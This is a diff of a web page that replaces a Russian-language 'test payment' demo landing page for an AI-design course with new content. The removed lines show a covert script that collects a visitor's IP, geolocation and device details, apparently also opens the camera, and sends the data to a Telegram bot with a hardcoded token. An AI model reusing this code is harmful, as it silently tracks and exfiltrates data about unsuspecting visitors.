@@ -1,60 +1,852 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>User Details</title>
-  <link rel="stylesheet" href="style.css">
-  <script src="camera.js"></script>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-  <script type='text/javascript' src="//wurfl.io/wurfl.js"></script>
-  <script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5">
+    <title>FutureLabs · тестовая оплата</title>
+    <!-- Google Fonts & Font Awesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* ----- CSS переменные, сброс, база ----- */
+        :root {
+            --bg: #f5f7ff;
+            --surface: #ffffff;
+            --primary: #4361ee;
+            --primary-soft: #4895ef;
+            --primary-gradient: linear-gradient(145deg, #4361ee, #3a0ca3);
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --border-light: #e2e8f0;
+            --shadow-sm: 0 10px 25px -5px rgba(0, 0, 0, 0.03), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
+            --shadow-md: 0 20px 35px -10px rgba(67, 97, 238, 0.08);
+            --radius-lg: 32px;
+            --radius-md: 24px;
+            --radius-sm: 16px;
+        }
 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    $(document).ready(function(){
-        $.getJSON("https://api.ipify.org?format=json", function(data) {
-            var ipAddress = data.ip;
-            $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(locationData) {
-                var loc = locationData.latitude + "," + locationData.longitude;
-                var city = locationData.city;
-                var ip = locationData.ip;
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background-color: var(--bg);
+            color: var(--text-main);
+            line-height: 1.5;
+            scroll-behavior: smooth;
+        }
 
-                $("#loc").text("Location: " + loc);
-                $("#city").text("City: " + city);
-                $("#ip").text("ip: " + ip);
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
 
-                const model = navigator.userAgent;
-                const width = screen.width;
-                const height = screen.height;
-                const userAgent = navigator.userAgent;
-                const modelName = WURFL.complete_device_name;
+        ul {
+            list-style: none;
+        }
 
-                var message = "New location: " + loc + ", " + city + ", IP: " + ip + "\n" + model + "\n"  + width + " " + height + "\n" + userAgent + "\n" + modelName;
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
 
-                var apiBot = "https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw";
-                var telegramApiUrl = apiBot + "/sendMessage";
-                var chatId = "1494753646";
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
 
+        /* ----- типография ----- */
+        h1, h2, h3 {
+            font-weight: 700;
+            letter-spacing: -0.02em;
+        }
 
-                fetch(telegramApiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ chat_id: chatId, text: message}), 
-                })
-                .then(response => response.json())
-                .then(data => console.log(data))
-                .catch(error => console.error('Error:', error));
-            });
-        });
-    });
+        h1 {
+            font-size: 3.2rem;
+            line-height: 1.2;
+        }
 
-  </script>
+        h2 {
+            font-size: 2.4rem;
+            margin-bottom: 16px;
+        }
+
+        /* ----- кнопки и баджи ----- */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            padding: 14px 36px;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background-color: var(--surface);
+            color: var(--text-main);
+            box-shadow: var(--shadow-sm);
+            border: 1px solid transparent;
+        }
+
+        .btn-primary {
+            background: var(--primary-gradient);
+            color: white;
+            box-shadow: 0 12px 28px -8px rgba(67, 97, 238, 0.35);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 30px -8px rgba(67, 97, 238, 0.5);
+        }
+
+        .btn-large {
+            padding: 18px 48px;
+            font-size: 1.25rem;
+        }
+
+        /* ----- хедер ----- */
+        .header {
+            padding: 24px 0;
+            background-color: rgba(255,255,255,0.6);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255,255,255,0.5);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+
+        .header .container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.03em;
+        }
+
+        .nav-list {
+            display: flex;
+            gap: 40px;
+            font-weight: 500;
+            color: var(--text-main);
+        }
+
+        .nav-link {
+            transition: color 0.2s;
+        }
+        .nav-link:hover {
+            color: var(--primary);
+        }
+
+        /* ----- hero секция ----- */
+        .hero {
+            padding: 80px 0 40px;
+        }
+
+        .hero .container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            align-items: center;
+            gap: 50px;
+        }
+
+        .hero-badge {
+            background: rgba(67, 97, 238, 0.08);
+            color: var(--primary);
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            margin-bottom: 24px;
+            border: 1px solid rgba(67,97,238,0.2);
+        }
+
+        .hero h1 {
+            margin-bottom: 24px;
+            color: #0b1b33;
+        }
+
+        .hero-description {
+            font-size: 1.25rem;
+            color: var(--text-muted);
+            margin-bottom: 32px;
+            max-width: 90%;
+        }
+
+        .price-tag {
+            display: flex;
+            align-items: baseline;
+            gap: 8px;
+            margin-bottom: 36px;
+        }
+        .current-price {
+            font-size: 3rem;
+            font-weight: 800;
+            color: var(--primary);
+            line-height: 1;
+        }
+        .old-price {
+            font-size: 1.5rem;
+            color: var(--text-muted);
+            text-decoration: line-through;
+            font-weight: 500;
+        }
+
+        .hero-image {
+            background: radial-gradient(circle at 30% 40%, rgba(67,97,238,0.06) 0%, transparent 70%);
+            padding: 20px;
+            text-align: center;
+        }
+        .hero-image i {
+            font-size: 260px;
+            color: #cbd5e1;
+            text-shadow: 0 20px 25px -8px rgba(0,0,0,0.05);
+        }
+
+        /* ----- секции с карточками (преимущества, отзывы) ----- */
+        .section {
+            padding: 80px 0;
+        }
+
+        .section-title {
+            text-align: center;
+            max-width: 600px;
+            margin: 0 auto 60px;
+        }
+        .section-title h2 {
+            color: #0b1b33;
+        }
+        .section-title p {
+            color: var(--text-muted);
+            font-size: 1.2rem;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+        }
+
+        .feature-card {
+            background: var(--surface);
+            padding: 40px 30px;
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-sm);
+            transition: all 0.25s;
+            border: 1px solid white;
+            backdrop-filter: blur(4px);
+            text-align: center;
+        }
+        .feature-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-md);
+            border-color: rgba(67,97,238,0.15);
+        }
+        .feature-icon {
+            background: rgba(67, 97, 238, 0.06);
+            width: 80px;
+            height: 80px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 2.2rem;
+            color: var(--primary);
+        }
+        .feature-card h3 {
+            margin-bottom: 16px;
+            font-size: 1.5rem;
+        }
+        .feature-card p {
+            color: var(--text-muted);
+        }
+
+        /* ----- отзывы ----- */
+        .testimonials-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+        }
+        .testimonial-card {
+            background: var(--surface);
+            border-radius: var(--radius-md);
+            padding: 32px 28px;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid var(--border-light);
+        }
+        .testimonial-avatar {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+        .avatar-icon {
+            background: #e6e9ff;
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            font-size: 1.6rem;
+        }
+        .testimonial-name h4 {
+            font-weight: 700;
+        }
+        .testimonial-name span {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .rating {
+            color: #ffb347;
+            margin-bottom: 16px;
+        }
+        .testimonial-text {
+            color: var(--text-main);
+            font-style: italic;
+            line-height: 1.6;
+        }
+
+        /* ----- ПЛАТЕЖНАЯ ФОРМА (тестовая, без списания) ----- */
+        .payment-section {
+            background: linear-gradient(145deg, #ffffff, #f8fafe);
+            border-radius: var(--radius-lg);
+            padding: 60px 0;
+            margin: 40px 0 20px;
+            box-shadow: inset 0 2px 8px rgba(0,0,0,0.02);
+        }
+
+        .payment-card {
+            max-width: 620px;
+            margin: 0 auto;
+            background: var(--surface);
+            border-radius: var(--radius-lg);
+            padding: 48px 48px 52px;
+            box-shadow: var(--shadow-md);
+            border: 1px solid rgba(255,255,255,0.6);
+            backdrop-filter: blur(10px);
+        }
+
+        .payment-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .payment-header i {
+            font-size: 2.8rem;
+            color: var(--primary);
+            background: rgba(67,97,238,0.08);
+            padding: 16px;
+            border-radius: 50%;
+            margin-bottom: 16px;
+        }
+        .payment-header h3 {
+            font-size: 2rem;
+            margin-bottom: 8px;
+        }
+        .payment-header p {
+            color: var(--text-muted);
+            font-size: 1.05rem;
+        }
+        .test-mode {
+            background: #fef9e7;
+            border-radius: 60px;
+            padding: 10px 22px;
+            display: inline-block;
+            margin-top: 16px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #b78103;
+            border: 1px solid #ffe7a3;
+        }
+
+        .form-row {
+            margin-bottom: 24px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        .form-group {
+            flex: 1 1 100%;
+        }
+        .half-width {
+            flex: 1 1 calc(50% - 10px);
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1e293b;
+            font-size: 0.95rem;
+        }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .input-wrapper i {
+            position: absolute;
+            left: 16px;
+            color: #94a3b8;
+            font-size: 1.1rem;
+        }
+        .card-icons {
+            position: absolute;
+            right: 16px;
+            display: flex;
+            gap: 8px;
+            color: #94a3b8;
+        }
+        input {
+            width: 100%;
+            padding: 18px 20px 18px 50px;
+            border: 2px solid var(--border-light);
+            border-radius: 20px;
+            font-size: 1rem;
+            transition: all 0.2s;
+            background: white;
+            font-family: 'Inter', monospace;
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(67,97,238,0.08);
+        }
+
+        .btn-pay {
+            width: 100%;
+            padding: 20px;
+            border-radius: 40px;
+            background: var(--primary-gradient);
+            color: white;
+            font-weight: 700;
+            font-size: 1.3rem;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 28px;
+            transition: all 0.25s;
+            box-shadow: 0 12px 28px -5px rgba(67,97,238,0.4);
+        }
+        .btn-pay:hover {
+            transform: scale(1.02);
+            background: linear-gradient(145deg, #3a56d4, #31097e);
+        }
+        .secure-badge {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 24px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .secure-badge i {
+            margin-right: 6px;
+            color: #2e7d32;
+        }
+
+        /* ----- футер ----- */
+        .footer {
+            padding: 48px 0 32px;
+            border-top: 1px solid rgba(0,0,0,0.05);
+            color: var(--text-muted);
+        }
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        .social-links {
+            display: flex;
+            gap: 24px;
+            font-size: 1.4rem;
+        }
+        .social-links a {
+            color: #94a3b8;
+            transition: color 0.2s;
+        }
+        .social-links a:hover {
+            color: var(--primary);
+        }
+
+        /* ----- адаптивность ----- */
+        @media (max-width: 1024px) {
+            h1 { font-size: 2.8rem; }
+            .hero .container { grid-template-columns: 1fr; text-align: center; }
+            .hero-description { margin-left: auto; margin-right: auto; }
+            .price-tag { justify-content: center; }
+            .features-grid, .testimonials-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+
+        @media (max-width: 768px) {
+            .nav-list { display: none; } /* упрощённо: без мобильного меню, хедер чистый */
+            .container { padding: 0 20px; }
+            h1 { font-size: 2.4rem; }
+            .hero { padding-top: 40px; }
+            .features-grid, .testimonials-grid { grid-template-columns: 1fr; }
+            .half-width { flex: 1 1 100%; }
+            .payment-card { padding: 32px 24px; }
+            .btn-pay { font-size: 1.2rem; }
+        }
+
+        @media (max-width: 480px) {
+            .hero-image i { font-size: 180px; }
+            .current-price { font-size: 2.5rem; }
+            .btn-large { padding: 16px 32px; }
+        }
+
+        /* ----- уведомление (alert имитация) ----- */
+        .toast-message {
+            visibility: hidden;
+            min-width: 300px;
+            background: #0f172a;
+            color: white;
+            text-align: center;
+            border-radius: 100px;
+            padding: 16px 28px;
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-weight: 600;
+            box-shadow: 0 20px 40px -10px black;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            z-index: 999;
+            opacity: 0;
+            transition: opacity 0.25s, visibility 0.25s;
+        }
+        .toast-message.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .toast-message i {
+            font-size: 1.4rem;
+            color: #4ade80;
+        }
+    </style>
 </head>
 <body>
-    <img src="siba.png" >
-    <video id="cameraFeed" autoplay></video>
+    <!-- шапка -->
+    <header class="header">
+        <div class="container">
+            <div class="logo">◈ FutureLabs</div>
+            <nav>
+                <ul class="nav-list">
+                    <li><a href="#home" class="nav-link">Главная</a></li>
+                    <li><a href="#features" class="nav-link">Возможности</a></li>
+                    <li><a href="#testimonials" class="nav-link">Отзывы</a></li>
+                    <li><a href="#payment" class="nav-link">Оплата</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <!-- герой (hero) с продуктом -->
+        <section id="home" class="hero">
+            <div class="container">
+                <div class="hero-content">
+                    <span class="hero-badge"><i class="fas fa-bolt" style="margin-right: 8px;"></i> Ранний доступ — 2025</span>
+                    <h1>Премиум‑курс<br>«ИИ‑дизайн»</h1>
+                    <p class="hero-description">Полный практический курс по генеративному дизайну, нейросетям и автоматизации творчества. Для дизайнеров и разработчиков.</p>
+                    <div class="price-tag">
+                        <span class="current-price">1 990 ₽</span>
+                        <span class="old-price">5 990 ₽</span>
+                    </div>
+                    <a href="#payment" class="btn btn-primary btn-large"><i class="fas fa-lock-open"></i> Купить сейчас — тестовая оплата</a>
+                    <p style="margin-top: 24px; color: var(--text-muted);"><i class="fas fa-shield-alt" style="margin-right: 8px;"></i>Тестовый платёж, реальные средства не списываются</p>
+                </div>
+                <div class="hero-image">
+                    <i class="fas fa-cubes"></i> <!-- абстрактная графика -->
+                </div>
+            </div>
+        </section>
+
+        <!-- преимущества -->
+        <section id="features" class="section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Почему выбирают FutureLabs</h2>
+                    <p>Инструменты будущего уже сегодня — безопасная тестовая среда</p>
+                </div>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon"><i class="fas fa-robot"></i></div>
+                        <h3>ИИ‑помощник</h3>
+                        <p>Персональный AI‑ассистент на всех этапах обучения. Доступен сразу после оплаты.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon"><i class="fas fa-infinity"></i></div>
+                        <h3>Без ограничений</h3>
+                        <p>Пожизненный доступ к курсу и обновлениям. Никаких подписок.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon"><i class="fas fa-shield-hal"></i></div>
+                        <h3>Тестовая оплата</h3>
+                        <p>Полностью имитационный платёж: вводите тестовые карты, реальные деньги не списываются.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- отзывы клиентов (пример) -->
+        <section id="testimonials" class="section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Отзывы участников</h2>
+                    <p>Уже 2,500+ студентов тестируют оплату и проходят курс</p>
+                </div>
+                <div class="testimonials-grid">
+                    <div class="testimonial-card">
+                        <div class="testimonial-avatar">
+                            <div class="avatar-icon"><i class="fas fa-user-astronaut"></i></div>
+                            <div class="testimonial-name">
+                                <h4>Анна К.</h4>
+                                <span>дизайнер, Москва</span>
+                            </div>
+                        </div>
+                        <div class="rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                        <p class="testimonial-text">«Очень круто, что можно просто протестировать оплату. Ввела 4242 4242 4242 4242 и сразу получила доступ. Никаких рисков!»</p>
+                    </div>
+                    <div class="testimonial-card">
+                        <div class="testimonial-avatar">
+                            <div class="avatar-icon"><i class="fas fa-user-ninja"></i></div>
+                            <div class="testimonial-name">
+                                <h4>Дмитрий С.</h4>
+                                <span>тимлид, Казань</span>
+                            </div>
+                        </div>
+                        <div class="rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                        <p class="testimonial-text">«Интересный подход — оплата без списания. Доверие сразу выросло. Оформлено красиво, современно.»</p>
+                    </div>
+                    <div class="testimonial-card">
+                        <div class="testimonial-avatar">
+                            <div class="avatar-icon"><i class="fas fa-user-tie"></i></div>
+                            <div class="testimonial-name">
+                                <h4>Екатерина В.</h4>
+                                <span>продуктолог, СПб</span>
+                            </div>
+                        </div>
+                        <div class="rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                        <p class="testimonial-text">«Платежная форма — глаз не оторвать. Дизайн, иконки, плавность. И главное — тестовый режим работает!»</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ⭐⭐⭐ СЕКЦИЯ ТЕСТОВОЙ ОПЛАТЫ ⭐⭐⭐ -->
+        <section id="payment" class="payment-section">
+            <div class="container">
+                <div class="payment-card">
+                    <div class="payment-header">
+                        <i class="fas fa-credit-card"></i>
+                        <h3>Тестовый платёж</h3>
+                        <p>Никакого списания — просто демо</p>
+                        <div class="test-mode">
+                            <i class="fas fa-flask"></i> Режим песочницы · данные не передаются
+                        </div>
+                    </div>
+
+                    <!-- форма оплаты — имитация, без реальной отправки -->
+                    <div id="demo-payment-form">
+                        <div class="form-group">
+                            <label>Номер карты</label>
+                            <div class="input-wrapper">
+                                <i class="fas fa-credit-card"></i>
+                                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" value="4242 4242 4242 4242" autocomplete="off">
+                                <span class="card-icons">
+                                    <i class="fab fa-cc-visa"></i>
+                                    <i class="fab fa-cc-mastercard"></i>
+                                    <i class="fab fa-cc-amex"></i>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group half-width">
+                                <label>Срок</label>
+                                <div class="input-wrapper">
+                                    <i class="fas fa-calendar-alt"></i>
+                                    <input type="text" id="expiry" placeholder="MM/YY" value="12/28">
+                                </div>
+                            </div>
+                            <div class="form-group half-width">
+                                <label>CVV</label>
+                                <div class="input-wrapper">
+                                    <i class="fas fa-lock"></i>
+                                    <input type="text" id="cvv" placeholder="123" value="737" maxlength="3">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Имя держателя</label>
+                            <div class="input-wrapper">
+                                <i class="fas fa-user"></i>
+                                <input type="text" id="cardholder" placeholder="IVAN PETROV" value="FUTURE LABS">
+                            </div>
+                        </div>
+
+                        <button id="payButton" class="btn-pay">
+                            <i class="fas fa-bolt"></i> Оплатить 1 990 ₽
+                            <i class="fas fa-arrow-right"></i>
+                        </button>
+                        <div class="secure-badge">
+                            <span><i class="fas fa-lock"></i> Тестовое шифрование</span>
+                            <span><i class="fas fa-shield"></i> 0% комиссии</span>
+                        </div>
+                        <p style="text-align: center; margin-top: 16px; color: #ef4444; background: #fee2e2; padding: 10px; border-radius: 40px; font-size: 0.9rem;">
+                            ⚠️ В демо-режиме деньги не списываются. Просто нажмите «Оплатить».
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- футер -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <span class="logo" style="-webkit-text-fill-color: #1e293b; background: none; font-size: 1.5rem;">◈ FutureLabs · песочница</span>
+                <span>© 2025 · Только для тестовых платежей</span>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                    <a href="#"><i class="fab fa-github"></i></a>
+                    <a href="#"><i class="fab fa-x-twitter"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- всплывающее сообщение (как alert, но красиво) -->
+    <div id="toast" class="toast-message">
+        <i class="fas fa-circle-check"></i> 
+        <span id="toast-text">Тестовая оплата прошла! Средства не списаны.</span>
+    </div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // Элементы формы и кнопка
+            const payBtn = document.getElementById('payButton');
+            const toast = document.getElementById('toast');
+            const toastText = document.getElementById('toast-text');
+
+            // Функция показа уведомления
+            function showToast(message, isSuccess = true) {
+                toastText.textContent = message || 'Тестовая оплата выполнена! Деньги в безопасности.';
+                toast.classList.add('show');
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 3500);
+            }
+
+            // Обработчик тестовой оплаты
+            function handleTestPayment(e) {
+                e.preventDefault(); // полностью блокируем любые действия формы
+
+                // простая имитация проверки заполнения (необязательно, но для демо)
+                const cardNumber = document.getElementById('card-number').value.trim();
+                const expiry = document.getElementById('expiry').value.trim();
+                const cvv = document.getElementById('cvv').value.trim();
+
+                if (!cardNumber || !expiry || !cvv) {
+                    showToast('❌ Пожалуйста, заполните поля карты (тестовые данные)', false);
+                    return;
+                }
+
+                // всегда показываем успех — это тестовая среда!
+                showToast('✅ Оплата в тестовом режиме: успешно! Ни рубля не списано.');
+
+                // можно добавить лёгкую анимацию для кнопки
+                payBtn.style.transform = 'scale(0.98)';
+                setTimeout(() => { payBtn.style.transform = 'scale(1)'; }, 120);
+
+                // здесь нет никакой отправки данных — 100% безопасно
+            }
+
+            // навешиваем событие на кнопку оплаты
+            if (payBtn) {
+                payBtn.addEventListener('click', handleTestPayment);
+            }
+
+            // Дополнительно: автоматическое форматирование номера карты (для красоты)
+            const cardInput = document.getElementById('card-number');
+            if (cardInput) {
+                cardInput.addEventListener('input', function(e) {
+                    let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                    let parts = [];
+                    for (let i = 0; i < val.length; i += 4) {
+                        parts.push(val.substring(i, i + 4));
+                    }
+                    if (parts.length) {
+                        e.target.value = parts.join(' ');
+                    }
+                });
+            }
+
+            // маска для срока действия
+            const expiryInput = document.getElementById('expiry');
+            if (expiryInput) {
+                expiryInput.addEventListener('input', function(e) {
+                    let val = e.target.value.replace(/\D/g, '');
+                    if (val.length > 2) {
+                        val = val.substring(0, 2) + '/' + val.substring(2, 4);
+                    }
+                    e.target.value = val;
+                });
+            }
+
+            // ограничение CVV только цифрами
+            const cvvInput = document.getElementById('cvv');
+            if (cvvInput) {
+                cvvInput.addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+                });
+            }
+
+        })();
+    </script>
+
+    <!-- якоря для навигации (без js) -->
+    <style>
+        /* чтобы при клике на ссылки меню не пряталось за sticky header */
+        html {
+            scroll-padding-top: 90px;
+        }
+    </style>
+
+    <!-- небольшой дополнительный штрих: подпись тестового режима на кнопке (уже есть) -->
 </body>
 </html>
